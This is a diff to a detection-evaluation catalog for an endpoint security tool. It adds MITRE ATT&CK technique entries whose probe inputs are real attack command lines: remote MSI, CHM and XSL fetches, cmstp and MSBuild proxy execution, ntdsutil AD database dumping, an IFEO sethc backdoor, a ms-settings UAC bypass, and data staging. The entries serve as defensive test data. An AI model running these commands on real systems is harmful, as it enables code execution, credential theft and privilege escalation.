@@ -1,4 +1,4 @@
-"""The technique catalog — the single source of truth for this evaluation.
+"""The technique catalog - the single source of truth for this evaluation.
 
 Every technique below was checked against Valkyrie's ACTUAL source before being
 assigned a `delivery` and `predicted_tier_b` value. Nothing here is a guess
@@ -100,13 +100,13 @@ import sys
 from pathlib import Path
 from dataclasses import dataclass, field, asdict
 
-CATALOG_VERSION = "2026-07-30.2"
+CATALOG_VERSION = "2026-08-24.breadth"
 
 # Delivery regimes, ordered roughly by reliability.
 # NOTE (2026-07-30): realtime_etw now also covers Sysmon EID 1 (process
 # creation). It previously meant only EID 8 / EID 10, because EID 1 ran just
-# classify_process() — which judges image name / path / parent and never saw
-# the command line — and then DROPPED anything that did not reach SEV_LOW, so
+# classify_process() - which judges image name / path / parent and never saw
+# the command line - and then DROPPED anything that did not reach SEV_LOW, so
 # the 32 MITRE-mapped IOA rules never ran on the richest real-time source on
 # the box. etw/sysmon.py now runs the same four-classifier stack as the poller
 # (classify_process + classify_cmdline + classify_behavior + classify_anomaly),
@@ -117,7 +117,7 @@ DELIVERY_REALTIME_ETW = "realtime_etw"          # Sysmon EID 1 / 8 / 10 direct w
 DELIVERY_ARTIFACT_POLL = "artifact_poll_15s"    # persistence_telemetry.py, artifact at rest
 DELIVERY_INLINE = "inline_request_path"         # DNS/network decision path, no polling
 DELIVERY_PURPOSE_BUILT = "purpose_built_watcher"  # ransomware_shield canary/entropy
-# browser_cred_watch.py — open-file-HANDLE poll over the known browser
+# browser_cred_watch.py - open-file-HANDLE poll over the known browser
 # credential stores. Slower than ETW but independent of the command line, so
 # it sees a compiled stealer that a cmdline rule never could. Not real-time:
 # an open-copy-close inside one interval is missed (kernel driver closes that).
@@ -1152,6 +1152,204 @@ EXTENDED = [
     ),
 ]
 
+# ---------------------------------------------------------------------------
+# Breadth expansion (2026-08-24) - a DIFFERENT ~13-technique set to probe
+# coverage across tactics the catalog had not exercised, including two entirely
+# new tactics (Privilege Escalation, Collection). Every predicted_tier_b here
+# was set by running the real classify_behavior against the exact command below
+# (SOURCE_CONFIRMED), NOT guessed - so the honest DETECT/MISS split is a real
+# breadth measurement, not a flattering one. The MISS entries (fodhelper UAC,
+# net localgroup, wscript VBS, rar archive, local data copy) are kept in
+# deliberately: an honest breadth test names what is NOT covered.
+BREADTH_EXPANSION = [
+    Technique(
+        id="evasion-msiexec-remote", technique_id="T1218.007",
+        technique_name="System Binary Proxy: Msiexec (remote MSI)",
+        tactic="Defense Evasion", art_test_ref="T1218.007 (documented cmdline)",
+        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
+        detector_path="valkyrie/behavioral_rules.py: msiexec proxy rule",
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "msiexec.exe", "parent": "cmd.exe",
+            "cmdline": r"msiexec.exe /q /i http://10.0.0.5/evil.msi", "path": ""},
+        notes="Remote MSI install via msiexec is a classic LOLBin proxy exec. "
+              "Fires classify_behavior -> T1218.007. Remote host is unroutable, "
+              "so the install fails harmlessly; the process (EID 1) is the signal.",
+    ),
+    Technique(
+        id="evasion-cmstp-inf", technique_id="T1218.003",
+        technique_name="System Binary Proxy: CMSTP",
+        tactic="Defense Evasion", art_test_ref="T1218.003 (documented cmdline)",
+        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
+        detector_path="valkyrie/behavioral_rules.py: cmstp rule",
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "cmstp.exe", "parent": "cmd.exe",
+            "cmdline": r"cmstp.exe /ni /s C:\Users\Public\evil.inf", "path": ""},
+        notes="cmstp /s executes a (malicious) INF; verified -> T1218.003. INF "
+              "absent, so it fails; the proxy-exec attempt is the detection.",
+    ),
+    Technique(
+        id="evasion-hh-chm", technique_id="T1218.001",
+        technique_name="System Binary Proxy: Compiled HTML File (hh.exe)",
+        tactic="Defense Evasion", art_test_ref="T1218.001 (documented cmdline)",
+        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
+        detector_path="valkyrie/behavioral_rules.py: hh.exe / chm rule",
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "hh.exe", "parent": "cmd.exe",
+            "cmdline": r"hh.exe http://10.0.0.5/evil.chm", "path": ""},
+        notes="hh.exe fetching a remote CHM is a known proxy-exec; verified -> "
+              "T1218.001.",
+    ),
+    Technique(
+        id="evasion-wmic-xsl", technique_id="T1220",
+        technique_name="XSL Script Processing (wmic /format)",
+        tactic="Defense Evasion", art_test_ref="T1220 (documented cmdline)",
+        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
+        detector_path="valkyrie/behavioral_rules.py: wmic XSL rule",
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "wmic.exe", "parent": "cmd.exe",
+            "cmdline": r'wmic process list /format:"http://10.0.0.5/evil.xsl"',
+            "path": ""},
+        notes="wmic /format with a remote XSL runs attacker script; verified -> "
+              "T1220.",
+    ),
+    Technique(
+        id="evasion-syncappv", technique_id="T1216",
+        technique_name="System Script Proxy: SyncAppvPublishingServer",
+        tactic="Defense Evasion", art_test_ref="T1216 (documented cmdline)",
+        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
+        detector_path="valkyrie/behavioral_rules.py: SyncAppvPublishingServer rule",
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "SyncAppvPublishingServer.exe", "parent": "cmd.exe",
+            "cmdline": r'SyncAppvPublishingServer.exe "n; Start-Process calc"',
+            "path": ""},
+        notes="Signed-binary script proxy; verified -> T1216. Payload just "
+              "launches calc.",
+    ),
+    Technique(
+        id="exec-msbuild-inline", technique_id="T1127.001",
+        technique_name="Trusted Developer Utilities: MSBuild",
+        tactic="Execution", art_test_ref="T1127.001 (documented cmdline)",
+        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
+        detector_path="valkyrie/behavioral_rules.py: MSBuild rule",
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "msbuild.exe", "parent": "cmd.exe",
+            "cmdline": r"msbuild.exe C:\Users\Public\evil.csproj", "path": ""},
+        notes="MSBuild running an inline-task project compiles+runs C# at build "
+              "time; verified -> T1127.001. Project absent, so it fails; the "
+              "invocation is the signal.",
+    ),
+    Technique(
+        id="cred-ntdsutil-ifm", technique_id="T1003.003",
+        technique_name="OS Credential Dumping: NTDS (ntdsutil IFM)",
+        tactic="Credential Access", art_test_ref="T1003.003 (documented cmdline)",
+        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
+        detector_path="valkyrie/behavioral_rules.py: ntdsutil rule",
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "ntdsutil.exe", "parent": "cmd.exe",
+            "cmdline": r"ntdsutil.exe ac i ntds ifm create full C:\temp q q",
+            "path": ""},
+        notes="ntdsutil IFM dumps the AD database; verified -> T1003.003. On a "
+              "non-DC it fails, but the invocation is the detection.",
+    ),
+    Technique(
+        id="persist-ifeo-debugger", technique_id="T1546.012",
+        technique_name="Event Triggered Execution: IFEO Debugger",
+        tactic="Persistence", art_test_ref="T1546.012 (documented cmdline)",
+        destructive=True, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
+        detector_path="valkyrie/behavioral_rules.py: IFEO debugger rule",
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "reg.exe", "parent": "cmd.exe",
+            "cmdline": r'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d cmd.exe /f',
+            "path": ""},
+        notes="Sets a Debugger on sethc.exe (accessibility) via IFEO - a real "
+              "persistence + privesc change, so destructive=True (revert after). "
+              "Verified -> T1546.012.",
+    ),
+    Technique(
+        id="privesc-uac-mssettings", technique_id="T1548.002",
+        technique_name="Abuse Elevation Control: Bypass UAC (ms-settings hijack)",
+        tactic="Privilege Escalation", art_test_ref="T1548.002 (documented cmdline)",
+        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
+        detector_path="valkyrie/behavioral_rules.py: UAC ms-settings hijack rule",
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "reg.exe", "parent": "cmd.exe",
+            "cmdline": r"reg add HKCU\Software\Classes\ms-settings\shell\open\command /d cmd.exe /f",
+            "path": ""},
+        notes="Registers a HKCU ms-settings command handler that fodhelper/"
+              "computerdefaults then auto-elevates - the classic fileless UAC "
+              "bypass. HKCU only (reversible). Verified -> T1548.002. FIRST "
+              "Privilege Escalation entry in the catalog.",
+    ),
+    # ---- honest MISS entries: what the breadth test shows is NOT covered ----
+    Technique(
+        id="disc-localgroup", technique_id="T1069.001",
+        technique_name="Permission Groups Discovery: Local Groups (net localgroup)",
+        tactic="Discovery", art_test_ref="T1069.001 (documented cmdline)",
+        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
+        detector_path="no dedicated rule; only via reconnaissance-burst if "
+                       "clustered with other discovery",
+        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "net.exe", "parent": "cmd.exe",
+            "cmdline": r"net localgroup administrators", "path": ""},
+        notes="No standalone rule fires on net localgroup (verified classify_"
+              "behavior -> None). Only caught if it lands in a discovery burst. "
+              "Honest gap: single-shot group enumeration is not detected.",
+    ),
+    Technique(
+        id="exec-wscript-vbs", technique_id="T1059.005",
+        technique_name="Command & Scripting Interpreter: Visual Basic (wscript)",
+        tactic="Execution", art_test_ref="T1059.005 (documented cmdline)",
+        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
+        detector_path="no dedicated rule for a bare wscript .vbs launch",
+        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "wscript.exe", "parent": "cmd.exe",
+            "cmdline": r"wscript.exe C:\Users\Public\evil.vbs", "path": ""},
+        notes="A bare wscript .vbs invocation does not fire a rule (verified -> "
+              "None). Honest gap: VBScript execution via wscript is uncovered "
+              "unless the script's own behaviour trips a later rule.",
+    ),
+    Technique(
+        id="collect-archive-rar", technique_id="T1560.001",
+        technique_name="Archive Collected Data: Archive via Utility (rar)",
+        tactic="Collection", art_test_ref="T1560.001 (documented cmdline)",
+        destructive=False, live_vm_safe=True, delivery=DELIVERY_REALTIME_ETW,
+        detector_path="no Collection-tactic rule content today",
+        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "rar.exe", "parent": "cmd.exe",
+            "cmdline": r"rar.exe a -r C:\Users\Public\loot.rar C:\Users\bob\Documents",
+            "path": ""},
+        notes="Staging data into an archive before exfil is uncovered (verified "
+              "-> None). FIRST Collection entry; honest gap - Valkyrie has no "
+              "Collection-tactic rules yet.",
+    ),
+    Technique(
+        id="collect-local-copy", technique_id="T1005",
+        technique_name="Data from Local System (bulk document copy)",
+        tactic="Collection", art_test_ref="T1005 (documented cmdline)",
+        destructive=False, live_vm_safe=True, delivery=DELIVERY_NONE,
+        detector_path="no code path checks for bulk local data collection",
+        predicted_tier_b="MISS", source_confidence=SOURCE_PARTIAL,
+        probe="ioa_rule", probe_input={
+            "image": "cmd.exe", "parent": "cmd.exe",
+            "cmdline": r"cmd.exe /c copy C:\Users\bob\Documents\*.docx C:\Users\Public\staging",
+            "path": ""},
+        notes="Bulk copy of user documents to a staging dir - predicted MISS "
+              "(no Collection rules). SOURCE_PARTIAL: honest, not source-traced.",
+    ),
+]
+
 ALL_TACTICS = {
     "Execution": EXECUTION,
     "Persistence": PERSISTENCE,
@@ -1162,6 +1360,7 @@ ALL_TACTICS = {
     "Command and Control": COMMAND_AND_CONTROL,
     "Impact": IMPACT,
     "Extended (behavioral rules)": EXTENDED,
+    "Breadth expansion 2026-08": BREADTH_EXPANSION,
 }
 
 
